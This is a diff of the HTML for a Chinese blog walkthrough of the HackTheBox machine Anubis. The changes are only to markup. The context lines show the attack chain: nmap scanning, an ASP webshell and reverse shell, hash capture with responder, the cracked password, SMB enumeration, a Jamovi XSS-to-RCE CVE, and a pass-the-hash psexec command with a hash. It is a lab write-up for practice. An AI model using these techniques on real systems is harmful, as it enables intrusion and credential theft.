@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;371  10.10.11.102   端口扫描443有个域名，加hosts： 1234567891011121314151617181920212223242526272829303132$ nmap -sC -sV 10.10.11.102Starting Nmap 7.92 ( http">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;371  10.10.11.102                                                                                                              端口扫描443有个域名，加hosts：">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Anubis - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/08/17/Anubis-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;371  10.10.11.102   端口扫描443有个域名，加hosts： 1234567891011121314151617181920212223242526272829303132$ nmap -sC -sV 10.10.11.102Starting Nmap 7.92 ( http">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;371  10.10.11.102                                                                                                              端口扫描443有个域名，加hosts：">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081701.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081702.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081703.jpg">
@@ -132,7 +132,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -222,24 +222,80 @@
 </li>
 <li><h2 id="10-10-11-102"><a href="#10-10-11-102" class="headerlink" title="10.10.11.102"></a>10.10.11.102</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081701.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081701.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>443有个域名，加hosts：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.102</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-17 14:06 CST</span><br><span class="line">Nmap scan report for 10.10.11.102</span><br><span class="line">Host is up (0.070s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">| ssl-cert: Subject: commonName=www.windcorp.htb</span><br><span class="line">| Subject Alternative Name: DNS:www.windcorp.htb</span><br><span class="line">| Not valid before: 2021-05-24T19:44:56</span><br><span class="line">|_Not valid after:  2031-05-24T19:54:56</span><br><span class="line">|_ssl-date: 2021-08-17T06:08:04+00:00; 0s from scanner time.</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2021-08-17T06:07:29</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3.1.1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 106.49 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="443"><a href="#443" class="headerlink" title="443"></a>443</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.102 www.windcorp.htb</span><br></pre></td></tr></table></figure>
 
 <p>域名访问：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081702.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081702.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>contact输入内容，经过priview.asp，也会写入到test.asp:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081703.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081704.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081705.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081703.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081704.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081705.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>那如果写入asp代码呢：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081706.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081706.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>可以看到成功解析，可以执行命令：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081707.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081707.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>通过webshell运行命令加载reverse shell，拿到的容器的system：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081708.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021081708.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="WEBSERVER01"><a href="#WEBSERVER01" class="headerlink" title="WEBSERVER01"></a>WEBSERVER01</h1><p>administrator桌面发现一个req.txt ,是一个证书请求，解码得到域名：softwareportal.windcorp.htb</p>
 <p>可以猜测这个域名对应网关，在我们的实例中是172.27.112.1：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 172.27.112.1</span><br><span class="line">curl 172.27.112.1 -Headers @&#123;"Host"="softwareportal.windcorp.htb"&#125; -UseBasicParsing</span><br></pre></td></tr></table></figure>
@@ -252,19 +308,47 @@
 <h2 id="req-txt"><a href="#req-txt" class="headerlink" title="req.txt"></a>req.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN CERTIFICATE REQUEST-----</span><br><span class="line">MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx</span><br><span class="line">ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k</span><br><span class="line">Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r&#x2F;hZHC</span><br><span class="line">KsK&#x2F;BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb</span><br><span class="line">BEHIH2bhGEfCenhILl&#x2F;9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL</span><br><span class="line">eEgNf5l33cbOcHIFm3C92&#x2F;cf2IvjHhaJWb+4a&#x2F;6PgTlcxBMne5OsR+4hc4YIhLnz</span><br><span class="line">QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg&#x2F;nvx&#x2F;&#x2F;YNyEas3mjA&#x2F;DSZiczsqDvCNM24YZOq</span><br><span class="line">qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu</span><br><span class="line">1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H</span><br><span class="line">JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P</span><br><span class="line">WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF&#x2F;MzoR3DpqO5T&#x2F;Dm9gNyOt</span><br><span class="line">yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F</span><br><span class="line">F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO&#x2F;D5B6JCEE3amuxU04</span><br><span class="line">CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso</span><br><span class="line">4TlwpQ&#x3D;&#x3D;</span><br><span class="line">-----END CERTIFICATE REQUEST-----</span><br></pre></td></tr></table></figure>
 
 <h1 id="softwareportal-windcorp-htb"><a href="#softwareportal-windcorp-htb" class="headerlink" title="softwareportal.windcorp.htb"></a>softwareportal.windcorp.htb</h1><p>通过代理访问softwareportal：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122901.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122901.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>提供一些软件安装，提供的软件链接格式：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;softwareportal.windcorp.htb&#x2F;install.asp?client&#x3D;172.27.120.203&amp;software&#x3D;7z1900-x64.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122902.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122902.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="localadmin"><a href="#localadmin" class="headerlink" title="localadmin"></a>localadmin</h2><p>如果修改链接中的ip为我们自己的，wireshark抓包能够看到winrm请求，启动responder捕获,得到localadmin的hash，破解出来密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">localadmin::windcorp:ad361ec8ab79ef4b:65F0C205C5C91FB6E0E9DEDEE1504B46:01010000000000007D990866481BD901D43E8DDC318490DE0000000002000800530043004E00560001001E00570049004E002D0033004E004900470052005100320043005A003500580004001400530043004E0056002E004C004F00430041004C0003003400570049004E002D0033004E004900470052005100320043005A00350058002E00530043004E0056002E004C004F00430041004C0005001400530043004E0056002E004C004F00430041004C000800300030000000000000000000000000210000A119F5420B26FA70F7226C71A677F6BEA0900C22B3E65133D7F4E9D47A231E420A0010000000000000000000000000000000000009001E0048005400540050002F00310030002E00310030002E00310034002E0037000000000000000000</span><br><span class="line"></span><br><span class="line">Secret123</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122903.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122903.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>使用得到的账号密码枚举smb，可以得到一些omv文件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.102/Shared -U windcorp.htb/localadmin Secret123</span><br><span class="line"></span><br><span class="line">smb: \Documents\Analytics\&gt; ls</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122904.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122904.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p><code>.omv</code>似乎与 Jamovi 有关，Jamovi 是上述安装程序之一。还值得注意的是，其中一个文件<code>Whatif.omv</code>的时间戳是今天，而其余文件则有一年多的时间。</p>
 <h1 id="Jamovi-CVE"><a href="#Jamovi-CVE" class="headerlink" title="Jamovi CVE"></a>Jamovi CVE</h1><p>XSS to RCE：</p>
 <ul>
@@ -284,8 +368,22 @@
 <p>然后使用得到的hash PTH登录administrator：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/Tools/impacket/examples/psexec.py -hashes :3CCC18280610C6CA3156F995B5899E09 administrator@10.10.11.102</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122905.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122906.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122905.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122906.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>cves/CVE-2021-28079.md at master · theart42/cves<br><a href="https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md" target="_blank" rel="noopener">https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md</a></li>
 <li>cfalta/PoshADCS: A proof of concept on attack vectors against Active Directory by abusing Active Directory Certificate Services (ADCS)<br><a href="https://github.com/cfalta/PoshADCS" target="_blank" rel="noopener">https://github.com/cfalta/PoshADCS</a></li>
